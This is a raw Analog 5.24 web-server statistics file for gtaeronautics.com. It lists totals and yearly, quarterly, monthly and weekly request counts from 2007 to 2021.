x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2021	07	04	06	08
x	FR	2007	12	18	17	05
x	LR	2021	07	02	23	57
x	E7	2021	07	04	06	08
x	SR	963440
x	S7	2390
x	NC	385209
x	C7	0
x	FL	401322
x	F7	399
x	RR	180
x	R7	0
x	NH	85211
x	H7	361
x	BT	35896928582
x	B7	107918443
1	Rr	51693	5.365	2021
1	Rr	89380	9.277	2020
1	Rr	80088	8.313	2019
1	Rr	68927	7.154	2018
1	Rr	60168	6.245	2017
1	Rr	73316	7.610	2016
1	Rr	80796	8.386	2015
1	Rr	110773	11.498	2014
1	Rr	65173	6.765	2013
1	Rr	60742	6.305	2012
1	Rr	57015	5.918	2011
1	Rr	22139	2.298	2010
1	Rr	69710	7.236	2009
1	Rr	71820	7.455	2008
1	Rr	1700	0.176	2007
1	*BT	R	110773	2014
Q	Rr	756	0.078	2021	3
Q	Rr	30675	3.184	2021	2
Q	Rr	20262	2.103	2021	1
Q	Rr	22199	2.304	2020	4
Q	Rr	23882	2.479	2020	3
Q	Rr	21656	2.248	2020	2
Q	Rr	21643	2.246	2020	1
Q	Rr	19098	1.982	2019	4
Q	Rr	19668	2.041	2019	3
Q	Rr	19827	2.058	2019	2
Q	Rr	21495	2.231	2019	1
Q	Rr	18129	1.882	2018	4
Q	Rr	17138	1.779	2018	3
Q	Rr	16928	1.757	2018	2
Q	Rr	16732	1.737	2018	1
Q	Rr	15937	1.654	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.747	2017	2
Q	Rr	27400	2.844	2017	1
Q	Rr	22114	2.295	2016	4
Q	Rr	17621	1.829	2016	3
Q	Rr	15878	1.648	2016	2
Q	Rr	17703	1.837	2016	1
Q	Rr	16575	1.720	2015	4
Q	Rr	22104	2.294	2015	3
Q	Rr	22485	2.334	2015	2
Q	Rr	19632	2.038	2015	1
Q	Rr	21142	2.194	2014	4
Q	Rr	22272	2.312	2014	3
Q	Rr	31453	3.265	2014	2
Q	Rr	35906	3.727	2014	1
Q	Rr	16436	1.706	2013	4
Q	Rr	15216	1.579	2013	3
Q	Rr	16545	1.717	2013	2
Q	Rr	16976	1.762	2013	1
Q	Rr	16578	1.721	2012	4
Q	Rr	12511	1.299	2012	3
Q	Rr	15816	1.642	2012	2
Q	Rr	15837	1.644	2012	1
Q	Rr	15444	1.603	2011	4
Q	Rr	17386	1.805	2011	3
Q	Rr	9395	0.975	2011	2
Q	Rr	14790	1.535	2011	1
Q	Rr	1603	0.166	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.458	2010	2
Q	Rr	6489	0.674	2010	1
Q	Rr	16350	1.697	2009	4
Q	Rr	18220	1.891	2009	3
Q	Rr	17115	1.776	2009	2
Q	Rr	18025	1.871	2009	1
Q	Rr	15905	1.651	2008	4
Q	Rr	15660	1.625	2008	3
Q	Rr	22448	2.330	2008	2
Q	Rr	17807	1.848	2008	1
Q	Rr	1700	0.176	2007	4
Q	*BT	R	35906	2014	1
m	Rr	756	0.078	2021	07
m	Rr	10152	1.054	2021	06
m	Rr	10231	1.062	2021	05
m	Rr	10292	1.068	2021	04
m	Rr	7948	0.825	2021	03
m	Rr	5800	0.602	2021	02
m	Rr	6514	0.676	2021	01
m	Rr	8069	0.838	2020	12
m	Rr	6579	0.683	2020	11
m	Rr	7551	0.784	2020	10
m	Rr	8028	0.833	2020	09
m	Rr	7741	0.803	2020	08
m	Rr	8113	0.842	2020	07
m	Rr	7317	0.759	2020	06
m	Rr	6898	0.716	2020	05
m	Rr	7441	0.772	2020	04
m	Rr	7524	0.781	2020	03
m	Rr	7322	0.760	2020	02
m	Rr	6797	0.705	2020	01
m	Rr	6573	0.682	2019	12
m	Rr	5917	0.614	2019	11
m	Rr	6608	0.686	2019	10
m	Rr	6791	0.705	2019	09
m	Rr	6597	0.685	2019	08
m	Rr	6280	0.652	2019	07
m	Rr	6317	0.656	2019	06
m	Rr	6847	0.711	2019	05
m	Rr	6663	0.692	2019	04
m	Rr	7059	0.733	2019	03
m	Rr	6374	0.662	2019	02
m	Rr	8062	0.837	2019	01
m	Rr	6957	0.722	2018	12
m	Rr	5422	0.563	2018	11
m	Rr	5750	0.597	2018	10
m	Rr	5458	0.567	2018	09
m	Rr	5735	0.595	2018	08
m	Rr	5945	0.617	2018	07
m	Rr	7110	0.738	2018	06
m	Rr	6440	0.668	2018	05
m	Rr	3378	0.351	2018	04
m	Rr	5789	0.601	2018	03
m	Rr	5369	0.557	2018	02
m	Rr	5574	0.579	2018	01
m	Rr	3906	0.405	2017	12
m	Rr	6533	0.678	2017	11
m	Rr	5498	0.571	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.709	2017	05
m	Rr	9999	1.038	2017	04
m	Rr	11887	1.234	2017	03
m	Rr	7941	0.824	2017	02
m	Rr	7572	0.786	2017	01
m	Rr	9483	0.984	2016	12
m	Rr	7121	0.739	2016	11
m	Rr	5510	0.572	2016	10
m	Rr	6288	0.653	2016	09
m	Rr	5888	0.611	2016	08
m	Rr	5445	0.565	2016	07
m	Rr	5042	0.523	2016	06
m	Rr	5495	0.570	2016	05
m	Rr	5341	0.554	2016	04
m	Rr	5558	0.577	2016	03
m	Rr	5548	0.576	2016	02
m	Rr	6597	0.685	2016	01
m	Rr	5574	0.579	2015	12
m	Rr	5330	0.553	2015	11
m	Rr	5671	0.589	2015	10
m	Rr	6196	0.643	2015	09
m	Rr	6788	0.705	2015	08
m	Rr	9120	0.947	2015	07
m	Rr	7156	0.743	2015	06
m	Rr	5694	0.591	2015	05
m	Rr	9635	1.000	2015	04
m	Rr	6215	0.645	2015	03
m	Rr	6084	0.631	2015	02
m	Rr	7333	0.761	2015	01
m	Rr	6608	0.686	2014	12
m	Rr	6997	0.726	2014	11
m	Rr	7537	0.782	2014	10
m	Rr	7043	0.731	2014	09
m	Rr	7324	0.760	2014	08
m	Rr	7905	0.820	2014	07
m	Rr	11654	1.210	2014	06
m	Rr	9211	0.956	2014	05
m	Rr	10588	1.099	2014	04
m	Rr	7817	0.811	2014	03
m	Rr	15229	1.581	2014	02
m	Rr	12860	1.335	2014	01
m	Rr	5325	0.553	2013	12
m	Rr	5513	0.572	2013	11
m	Rr	5598	0.581	2013	10
m	Rr	4655	0.483	2013	09
m	Rr	4938	0.513	2013	08
m	Rr	5623	0.584	2013	07
m	Rr	5492	0.570	2013	06
m	Rr	5211	0.541	2013	05
m	Rr	5842	0.606	2013	04
m	Rr	6068	0.630	2013	03
m	Rr	5055	0.525	2013	02
m	Rr	5853	0.608	2013	01
m	Rr	5688	0.590	2012	12
m	Rr	5477	0.568	2012	11
m	Rr	5413	0.562	2012	10
m	Rr	4331	0.450	2012	09
m	Rr	3866	0.401	2012	08
m	Rr	4314	0.448	2012	07
m	Rr	4655	0.483	2012	06
m	Rr	6047	0.628	2012	05
m	Rr	5114	0.531	2012	04
m	Rr	6128	0.636	2012	03
m	Rr	5430	0.564	2012	02
m	Rr	4279	0.444	2012	01
m	Rr	5548	0.576	2011	12
m	Rr	4779	0.496	2011	11
m	Rr	5117	0.531	2011	10
m	Rr	5431	0.564	2011	09
m	Rr	6256	0.649	2011	08
m	Rr	5699	0.592	2011	07
m	Rr	5420	0.563	2011	06
m	Rr	3975	0.413	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.374	2011	03
m	Rr	5171	0.537	2011	02
m	Rr	6011	0.624	2011	01
m	Rr	1603	0.166	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.426	2010	06
m	Rr	5018	0.521	2010	05
m	Rr	4928	0.512	2010	04
m	Rr	5095	0.529	2010	03
m	Rr	1394	0.145	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.484	2009	12
m	Rr	6187	0.642	2009	11
m	Rr	5498	0.571	2009	10
m	Rr	5066	0.526	2009	09
m	Rr	5718	0.593	2009	08
m	Rr	7436	0.772	2009	07
m	Rr	5685	0.590	2009	06
m	Rr	6120	0.635	2009	05
m	Rr	5310	0.551	2009	04
m	Rr	5515	0.572	2009	03
m	Rr	6123	0.636	2009	02
m	Rr	6387	0.663	2009	01
m	Rr	5763	0.598	2008	12
m	Rr	5420	0.563	2008	11
m	Rr	4722	0.490	2008	10
m	Rr	5435	0.564	2008	09
m	Rr	4843	0.503	2008	08
m	Rr	5382	0.559	2008	07
m	Rr	6082	0.631	2008	06
m	Rr	9946	1.032	2008	05
m	Rr	6420	0.666	2008	04
m	Rr	5431	0.564	2008	03
m	Rr	6469	0.671	2008	02
m	Rr	5907	0.613	2008	01
m	Rr	1700	0.176	2007	12
m	*BT	R	15229	2014	02
W	Rr	2524	0.262	2021	06	27
W	Rr	2466	0.256	2021	06	20
W	Rr	2262	0.235	2021	06	13
W	Rr	2264	0.235	2021	06	06
W	Rr	2101	0.218	2021	05	30
W	Rr	3009	0.312	2021	05	23
W	Rr	1989	0.206	2021	05	16
W	Rr	2386	0.248	2021	05	09
W	Rr	2138	0.222	2021	05	02
W	Rr	1668	0.173	2021	04	25
W	Rr	2413	0.250	2021	04	18
W	Rr	3035	0.315	2021	04	11
W	Rr	2709	0.281	2021	04	04
W	Rr	1942	0.202	2021	03	28
W	Rr	1666	0.173	2021	03	21
W	Rr	1476	0.153	2021	03	14
W	Rr	1713	0.178	2021	03	07
W	Rr	1777	0.184	2021	02	28
W	Rr	1173	0.122	2021	02	21
W	Rr	1101	0.114	2021	02	14
W	Rr	1699	0.176	2021	02	07
W	Rr	1867	0.194	2021	01	31
W	Rr	1404	0.146	2021	01	24
W	Rr	1564	0.162	2021	01	17
W	Rr	1431	0.149	2021	01	10
W	Rr	1666	0.173	2021	01	03
W	Rr	1926	0.200	2020	12	27
W	Rr	1572	0.163	2020	12	20
W	Rr	1404	0.146	2020	12	13
W	Rr	2272	0.236	2020	12	06
W	Rr	1522	0.158	2020	11	29
W	Rr	1722	0.179	2020	11	22
W	Rr	1580	0.164	2020	11	15
W	Rr	1401	0.145	2020	11	08
W	Rr	1499	0.156	2020	11	01
W	Rr	1470	0.153	2020	10	25
W	Rr	2379	0.247	2020	10	18
W	Rr	1559	0.162	2020	10	11
W	Rr	1729	0.179	2020	10	04
W	Rr	1674	0.174	2020	09	27
W	Rr	1786	0.185	2020	09	20
W	Rr	2200	0.228	2020	09	13
W	Rr	1677	0.174	2020	09	06
W	Rr	1596	0.166	2020	08	30
W	Rr	1833	0.190	2020	08	23
W	Rr	1814	0.188	2020	08	16
W	Rr	2206	0.229	2020	08	09
W	Rr	1397	0.145	2020	08	02
W	Rr	1816	0.188	2020	07	26
W	Rr	1949	0.202	2020	07	19
W	Rr	1532	0.159	2020	07	12
W	Rr	1976	0.205	2020	07	05
W	Rr	1600	0.166	2020	06	28
W	Rr	1627	0.169	2020	06	21
W	Rr	2101	0.218	2020	06	14
W	Rr	1590	0.165	2020	06	07
W	Rr	1492	0.155	2020	05	31
W	Rr	1556	0.162	2020	05	24
W	Rr	1756	0.182	2020	05	17
W	Rr	1568	0.163	2020	05	10
W	Rr	1567	0.163	2020	05	03
W	Rr	1734	0.180	2020	04	26
W	Rr	1675	0.174	2020	04	19
W	Rr	1702	0.177	2020	04	12
W	Rr	1965	0.204	2020	04	05
W	Rr	1329	0.138	2020	03	29
W	Rr	1818	0.189	2020	03	22
W	Rr	1345	0.140	2020	03	15
W	Rr	1581	0.164	2020	03	08
W	Rr	2014	0.209	2020	03	01
W	Rr	1942	0.202	2020	02	23
W	Rr	1748	0.181	2020	02	16
W	Rr	1949	0.202	2020	02	09
W	Rr	1683	0.175	2020	02	02
W	Rr	1436	0.149	2020	01	26
W	Rr	1792	0.186	2020	01	19
W	Rr	1519	0.158	2020	01	12
W	Rr	1420	0.147	2020	01	05
W	Rr	1109	0.115	2019	12	29
W	Rr	1023	0.106	2019	12	22
W	Rr	1584	0.164	2019	12	15
W	Rr	1783	0.185	2019	12	08
W	Rr	1704	0.177	2019	12	01
W	Rr	1178	0.122	2019	11	24
W	Rr	1697	0.176	2019	11	17
W	Rr	1510	0.157	2019	11	10
W	Rr	1383	0.144	2019	11	03
W	Rr	1309	0.136	2019	10	27
W	Rr	1473	0.153	2019	10	20
W	Rr	1519	0.158	2019	10	13
W	Rr	1485	0.154	2019	10	06
W	Rr	1416	0.147	2019	09	29
W	Rr	1499	0.156	2019	09	22
W	Rr	1652	0.171	2019	09	15
W	Rr	1710	0.177	2019	09	08
W	Rr	1485	0.154	2019	09	01
W	Rr	1689	0.175	2019	08	25
W	Rr	1315	0.136	2019	08	18
W	Rr	1619	0.168	2019	08	11
W	Rr	1558	0.162	2019	08	04
W	Rr	1360	0.141	2019	07	28
W	Rr	1191	0.124	2019	07	21
W	Rr	1730	0.180	2019	07	14
W	Rr	1299	0.135	2019	07	07
W	Rr	1339	0.139	2019	06	30
W	Rr	1592	0.165	2019	06	23
W	Rr	1497	0.155	2019	06	16
W	Rr	1450	0.151	2019	06	09
W	Rr	1555	0.161	2019	06	02
W	Rr	1289	0.134	2019	05	26
W	Rr	1863	0.193	2019	05	19
W	Rr	1385	0.144	2019	05	12
W	Rr	1553	0.161	2019	05	05
W	Rr	1655	0.172	2019	04	28
W	Rr	1282	0.133	2019	04	21
W	Rr	1503	0.156	2019	04	14
W	Rr	1623	0.168	2019	04	07
W	Rr	1715	0.178	2019	03	31
W	Rr	1882	0.195	2019	03	24
W	Rr	1464	0.152	2019	03	17
W	Rr	1381	0.143	2019	03	10
W	Rr	1627	0.169	2019	03	03
W	Rr	1773	0.184	2019	02	24
W	Rr	1669	0.173	2019	02	17
W	Rr	1483	0.154	2019	02	10
W	Rr	1391	0.144	2019	02	03
W	Rr	1797	0.187	2019	01	27
W	Rr	1963	0.204	2019	01	20
W	Rr	2029	0.211	2019	01	13
W	Rr	1696	0.176	2019	01	06
W	Rr	1526	0.158	2018	12	30
W	Rr	1226	0.127	2018	12	23
W	Rr	1442	0.150	2018	12	16
W	Rr	1936	0.201	2018	12	09
W	Rr	1809	0.188	2018	12	02
W	Rr	1295	0.134	2018	11	25
W	Rr	1820	0.189	2018	11	18
W	Rr	1802	0.187	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.153	2018	10	28
W	Rr	1106	0.115	2018	10	21
W	Rr	1427	0.148	2018	10	14
W	Rr	1214	0.126	2018	10	07
W	Rr	1168	0.121	2018	09	30
W	Rr	1420	0.147	2018	09	23
W	Rr	1197	0.124	2018	09	16
W	Rr	1388	0.144	2018	09	09
W	Rr	1320	0.137	2018	09	02
W	Rr	1246	0.129	2018	08	26
W	Rr	1214	0.126	2018	08	19
W	Rr	1366	0.142	2018	08	12
W	Rr	1195	0.124	2018	08	05
W	Rr	1346	0.140	2018	07	29
W	Rr	1374	0.143	2018	07	22
W	Rr	1508	0.157	2018	07	15
W	Rr	1522	0.158	2018	07	08
W	Rr	909	0.094	2018	07	01
W	Rr	1444	0.150	2018	06	24
W	Rr	2682	0.278	2018	06	17
W	Rr	1365	0.142	2018	06	10
W	Rr	1329	0.138	2018	06	03
W	Rr	1275	0.132	2018	05	27
W	Rr	1392	0.144	2018	05	20
W	Rr	1321	0.137	2018	05	13
W	Rr	1527	0.158	2018	05	06
W	Rr	1517	0.157	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.142	2018	04	15
W	Rr	1712	0.178	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.160	2018	03	25
W	Rr	1342	0.139	2018	03	18
W	Rr	2429	0.252	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.142	2018	02	25
W	Rr	1308	0.136	2018	02	18
W	Rr	1439	0.149	2018	02	11
W	Rr	1731	0.180	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.149	2018	01	21
W	Rr	1578	0.164	2018	01	14
W	Rr	1471	0.153	2018	01	07
W	Rr	1246	0.129	2017	12	31
W	Rr	1033	0.107	2017	12	24
W	Rr	1103	0.114	2017	12	17
W	Rr	1406	0.146	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.139	2017	11	26
W	Rr	1427	0.148	2017	11	19
W	Rr	1662	0.173	2017	11	12
W	Rr	1414	0.147	2017	11	05
W	Rr	1349	0.140	2017	10	29
W	Rr	1208	0.125	2017	10	22
W	Rr	2013	0.209	2017	10	15
W	Rr	1832	0.190	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.003	2017	05	28
W	Rr	1838	0.191	2017	05	21
W	Rr	1915	0.199	2017	05	14
W	Rr	1676	0.174	2017	05	07
W	Rr	1677	0.174	2017	04	30
W	Rr	2071	0.215	2017	04	23
W	Rr	1978	0.205	2017	04	16
W	Rr	1874	0.195	2017	04	09
W	Rr	3435	0.357	2017	04	02
W	Rr	2619	0.272	2017	03	26
W	Rr	2633	0.273	2017	03	19
W	Rr	2413	0.250	2017	03	12
W	Rr	3092	0.321	2017	03	05
W	Rr	2295	0.238	2017	02	26
W	Rr	2204	0.229	2017	02	19
W	Rr	1869	0.194	2017	02	12
W	Rr	1973	0.205	2017	02	05
W	Rr	1783	0.185	2017	01	29
W	Rr	1768	0.184	2017	01	22
W	Rr	1585	0.165	2017	01	15
W	Rr	1768	0.184	2017	01	08
W	Rr	1740	0.181	2017	01	01
W	Rr	1549	0.161	2016	12	25
W	Rr	2202	0.229	2016	12	18
W	Rr	1812	0.188	2016	12	11
W	Rr	2648	0.275	2016	12	04
W	Rr	2236	0.232	2016	11	27
W	Rr	1321	0.137	2016	11	20
W	Rr	1996	0.207	2016	11	13
W	Rr	1716	0.178	2016	11	06
W	Rr	1564	0.162	2016	10	30
W	Rr	1362	0.141	2016	10	23
W	Rr	1707	0.177	2016	10	16
W	Rr	1696	0.176	2016	10	09
W	Rr	36	0.004	2016	10	02
W	Rr	2002	0.208	2016	09	25
W	Rr	1399	0.145	2016	09	18
W	Rr	1199	0.124	2016	09	11
W	Rr	1326	0.138	2016	09	04
W	Rr	1316	0.137	2016	08	28
W	Rr	1257	0.130	2016	08	21
W	Rr	1208	0.125	2016	08	14
W	Rr	1602	0.166	2016	08	07
W	Rr	1319	0.137	2016	07	31
W	Rr	1796	0.186	2016	07	24
W	Rr	1171	0.122	2016	07	17
W	Rr	1167	0.121	2016	07	10
W	Rr	917	0.095	2016	07	03
W	Rr	920	0.095	2016	06	26
W	Rr	1179	0.122	2016	06	19
W	Rr	1288	0.134	2016	06	12
W	Rr	1237	0.128	2016	06	05
W	Rr	1263	0.131	2016	05	29
W	Rr	1338	0.139	2016	05	22
W	Rr	1184	0.123	2016	05	15
W	Rr	1365	0.142	2016	05	08
W	Rr	974	0.101	2016	05	01
W	Rr	1311	0.136	2016	04	24
W	Rr	1127	0.117	2016	04	17
W	Rr	1248	0.130	2016	04	10
W	Rr	1451	0.151	2016	04	03
W	Rr	987	0.102	2016	03	27
W	Rr	1233	0.128	2016	03	20
W	Rr	1347	0.140	2016	03	13
W	Rr	1347	0.140	2016	03	06
W	Rr	1236	0.128	2016	02	28
W	Rr	1422	0.148	2016	02	21
W	Rr	1085	0.113	2016	02	14
W	Rr	1427	0.148	2016	02	07
W	Rr	1359	0.141	2016	01	31
W	Rr	1708	0.177	2016	01	24
W	Rr	1476	0.153	2016	01	17
W	Rr	1563	0.162	2016	01	10
W	Rr	1381	0.143	2016	01	03
W	Rr	1273	0.132	2015	12	27
W	Rr	1084	0.113	2015	12	20
W	Rr	1344	0.140	2015	12	13
W	Rr	1336	0.139	2015	12	06
W	Rr	1123	0.117	2015	11	29
W	Rr	960	0.100	2015	11	22
W	Rr	1337	0.139	2015	11	15
W	Rr	1400	0.145	2015	11	08
W	Rr	1383	0.144	2015	11	01
W	Rr	1250	0.130	2015	10	25
W	Rr	1366	0.142	2015	10	18
W	Rr	1367	0.142	2015	10	11
W	Rr	1214	0.126	2015	10	04
W	Rr	1152	0.120	2015	09	27
W	Rr	1387	0.144	2015	09	20
W	Rr	1655	0.172	2015	09	13
W	Rr	1526	0.158	2015	09	06
W	Rr	1242	0.129	2015	08	30
W	Rr	1800	0.187	2015	08	23
W	Rr	1527	0.158	2015	08	16
W	Rr	1386	0.144	2015	08	09
W	Rr	1593	0.165	2015	08	02
W	Rr	1567	0.163	2015	07	26
W	Rr	1980	0.206	2015	07	19
W	Rr	2180	0.226	2015	07	12
W	Rr	2008	0.208	2015	07	05
W	Rr	2297	0.238	2015	06	28
W	Rr	1556	0.162	2015	06	21
W	Rr	1380	0.143	2015	06	14
W	Rr	2013	0.209	2015	06	07
W	Rr	1651	0.171	2015	05	31
W	Rr	1224	0.127	2015	05	24
W	Rr	1355	0.141	2015	05	17
W	Rr	1179	0.122	2015	05	10
W	Rr	1436	0.149	2015	05	03
W	Rr	1671	0.173	2015	04	26
W	Rr	1878	0.195	2015	04	19
W	Rr	2326	0.241	2015	04	12
W	Rr	2636	0.274	2015	04	05
W	Rr	2297	0.238	2015	03	29
W	Rr	1237	0.128	2015	03	22
W	Rr	1453	0.151	2015	03	15
W	Rr	1399	0.145	2015	03	08
W	Rr	1287	0.134	2015	03	01
W	Rr	1249	0.130	2015	02	22
W	Rr	1373	0.143	2015	02	15
W	Rr	1790	0.186	2015	02	08
W	Rr	1672	0.174	2015	02	01
W	Rr	1543	0.160	2015	01	25
W	Rr	1463	0.152	2015	01	18
W	Rr	1696	0.176	2015	01	11
W	Rr	1707	0.177	2015	01	04
W	Rr	1833	0.190	2014	12	28
W	Rr	1335	0.139	2014	12	21
W	Rr	1644	0.171	2014	12	14
W	Rr	1541	0.160	2014	12	07
W	Rr	1335	0.139	2014	11	30
W	Rr	1262	0.131	2014	11	23
W	Rr	2009	0.209	2014	11	16
W	Rr	1566	0.163	2014	11	09
W	Rr	1814	0.188	2014	11	02
W	Rr	1452	0.151	2014	10	26
W	Rr	1642	0.170	2014	10	19
W	Rr	1795	0.186	2014	10	12
W	Rr	1836	0.191	2014	10	05
W	Rr	1662	0.173	2014	09	28
W	Rr	1843	0.191	2014	09	21
W	Rr	1678	0.174	2014	09	14
W	Rr	1598	0.166	2014	09	07
W	Rr	1418	0.147	2014	08	31
W	Rr	1584	0.164	2014	08	24
W	Rr	1571	0.163	2014	08	17
W	Rr	1727	0.179	2014	08	10
W	Rr	1927	0.200	2014	08	03
W	Rr	1691	0.176	2014	07	27
W	Rr	1702	0.177	2014	07	20
W	Rr	1624	0.169	2014	07	13
W	Rr	1831	0.190	2014	07	06
W	Rr	1867	0.194	2014	06	29
W	Rr	1927	0.200	2014	06	22
W	Rr	2134	0.221	2014	06	15
W	Rr	4851	0.504	2014	06	08
W	Rr	2293	0.238	2014	06	01
W	Rr	3180	0.330	2014	05	25
W	Rr	1468	0.152	2014	05	18
W	Rr	1808	0.188	2014	05	11
W	Rr	1998	0.207	2014	05	04
W	Rr	1876	0.195	2014	04	27
W	Rr	2330	0.242	2014	04	20
W	Rr	2565	0.266	2014	04	13
W	Rr	2652	0.275	2014	04	06
W	Rr	2574	0.267	2014	03	30
W	Rr	1186	0.123	2014	03	23
W	Rr	1305	0.135	2014	03	16
W	Rr	2273	0.236	2014	03	09
W	Rr	2231	0.232	2014	03	02
W	Rr	1925	0.200	2014	02	23
W	Rr	7060	0.733	2014	02	16
W	Rr	2854	0.296	2014	02	09
W	Rr	3190	0.331	2014	02	02
W	Rr	3743	0.389	2014	01	26
W	Rr	3643	0.378	2014	01	19
W	Rr	2961	0.307	2014	01	12
W	Rr	2319	0.241	2014	01	05
W	Rr	981	0.102	2013	12	29
W	Rr	1108	0.115	2013	12	22
W	Rr	1226	0.127	2013	12	15
W	Rr	1285	0.133	2013	12	08
W	Rr	1289	0.134	2013	12	01
W	Rr	1404	0.146	2013	11	24
W	Rr	1142	0.119	2013	11	17
W	Rr	1334	0.138	2013	11	10
W	Rr	1277	0.133	2013	11	03
W	Rr	1035	0.107	2013	10	27
W	Rr	1309	0.136	2013	10	20
W	Rr	1302	0.135	2013	10	13
W	Rr	1432	0.149	2013	10	06
W	Rr	1178	0.122	2013	09	29
W	Rr	947	0.098	2013	09	22
W	Rr	1254	0.130	2013	09	15
W	Rr	1099	0.114	2013	09	08
W	Rr	1053	0.109	2013	09	01
W	Rr	1010	0.105	2013	08	25
W	Rr	1102	0.114	2013	08	18
W	Rr	1063	0.110	2013	08	11
W	Rr	1105	0.115	2013	08	04
W	Rr	1377	0.143	2013	07	28
W	Rr	1498	0.155	2013	07	21
W	Rr	1295	0.134	2013	07	14
W	Rr	1237	0.128	2013	07	07
W	Rr	1003	0.104	2013	06	30
W	Rr	1275	0.132	2013	06	23
W	Rr	1072	0.111	2013	06	16
W	Rr	1249	0.130	2013	06	09
W	Rr	1521	0.158	2013	06	02
W	Rr	1256	0.130	2013	05	26
W	Rr	1091	0.113	2013	05	19
W	Rr	1359	0.141	2013	05	12
W	Rr	1130	0.117	2013	05	05
W	Rr	1215	0.126	2013	04	28
W	Rr	1368	0.142	2013	04	21
W	Rr	1318	0.137	2013	04	14
W	Rr	1408	0.146	2013	04	07
W	Rr	1277	0.133	2013	03	31
W	Rr	1452	0.151	2013	03	24
W	Rr	1418	0.147	2013	03	17
W	Rr	1217	0.126	2013	03	10
W	Rr	1490	0.155	2013	03	03
W	Rr	1353	0.140	2013	02	24
W	Rr	1268	0.132	2013	02	17
W	Rr	1274	0.132	2013	02	10
W	Rr	1153	0.120	2013	02	03
W	Rr	1266	0.131	2013	01	27
W	Rr	1271	0.132	2013	01	20
W	Rr	1449	0.150	2013	01	13
W	Rr	1253	0.130	2013	01	06
W	Rr	1309	0.136	2012	12	30
W	Rr	1156	0.120	2012	12	23
W	Rr	1336	0.139	2012	12	16
W	Rr	1575	0.163	2012	12	09
W	Rr	1087	0.113	2012	12	02
W	Rr	1376	0.143	2012	11	25
W	Rr	1136	0.118	2012	11	18
W	Rr	1341	0.139	2012	11	11
W	Rr	1418	0.147	2012	11	04
W	Rr	1103	0.114	2012	10	28
W	Rr	1200	0.125	2012	10	21
W	Rr	1382	0.143	2012	10	14
W	Rr	1127	0.117	2012	10	07
W	Rr	1187	0.123	2012	09	30
W	Rr	1172	0.122	2012	09	23
W	Rr	1034	0.107	2012	09	16
W	Rr	944	0.098	2012	09	09
W	Rr	958	0.099	2012	09	02
W	Rr	734	0.076	2012	08	26
W	Rr	881	0.091	2012	08	19
W	Rr	874	0.091	2012	08	12
W	Rr	973	0.101	2012	08	05
W	Rr	1010	0.105	2012	07	29
W	Rr	943	0.098	2012	07	22
W	Rr	1089	0.113	2012	07	15
W	Rr	888	0.092	2012	07	08
W	Rr	845	0.088	2012	07	01
W	Rr	1070	0.111	2012	06	24
W	Rr	1050	0.109	2012	06	17
W	Rr	1271	0.132	2012	06	10
W	Rr	957	0.099	2012	06	03
W	Rr	1249	0.130	2012	05	27
W	Rr	1055	0.110	2012	05	20
W	Rr	1392	0.144	2012	05	13
W	Rr	1140	0.118	2012	05	06
W	Rr	1807	0.188	2012	04	29
W	Rr	1225	0.127	2012	04	22
W	Rr	1264	0.131	2012	04	15
W	Rr	1075	0.112	2012	04	08
W	Rr	1261	0.131	2012	04	01
W	Rr	1345	0.140	2012	03	25
W	Rr	1254	0.130	2012	03	18
W	Rr	1478	0.153	2012	03	11
W	Rr	1503	0.156	2012	03	04
W	Rr	1532	0.159	2012	02	26
W	Rr	1464	0.152	2012	02	19
W	Rr	1154	0.120	2012	02	12
W	Rr	1240	0.129	2012	02	05
W	Rr	1088	0.113	2012	01	29
W	Rr	1125	0.117	2012	01	22
W	Rr	60	0.006	2012	01	15
W	Rr	1472	0.153	2012	01	08
W	Rr	1122	0.116	2012	01	01
W	Rr	888	0.092	2011	12	25
W	Rr	1360	0.141	2011	12	18
W	Rr	1486	0.154	2011	12	11
W	Rr	1330	0.138	2011	12	04
W	Rr	1094	0.114	2011	11	27
W	Rr	1062	0.110	2011	11	20
W	Rr	1123	0.117	2011	11	13
W	Rr	975	0.101	2011	11	06
W	Rr	1264	0.131	2011	10	30
W	Rr	1140	0.118	2011	10	23
W	Rr	1211	0.126	2011	10	16
W	Rr	1236	0.128	2011	10	09
W	Rr	1128	0.117	2011	10	02
W	Rr	1083	0.112	2011	09	25
W	Rr	1451	0.151	2011	09	18
W	Rr	1278	0.133	2011	09	11
W	Rr	1219	0.127	2011	09	04
W	Rr	1316	0.137	2011	08	28
W	Rr	1119	0.116	2011	08	21
W	Rr	1484	0.154	2011	08	14
W	Rr	1671	0.173	2011	08	07
W	Rr	1319	0.137	2011	07	31
W	Rr	1197	0.124	2011	07	24
W	Rr	1504	0.156	2011	07	17
W	Rr	1367	0.142	2011	07	10
W	Rr	1205	0.125	2011	07	03
W	Rr	1333	0.138	2011	06	26
W	Rr	1059	0.110	2011	06	19
W	Rr	1353	0.140	2011	06	12
W	Rr	1275	0.132	2011	06	05
W	Rr	983	0.102	2011	05	29
W	Rr	1262	0.131	2011	05	22
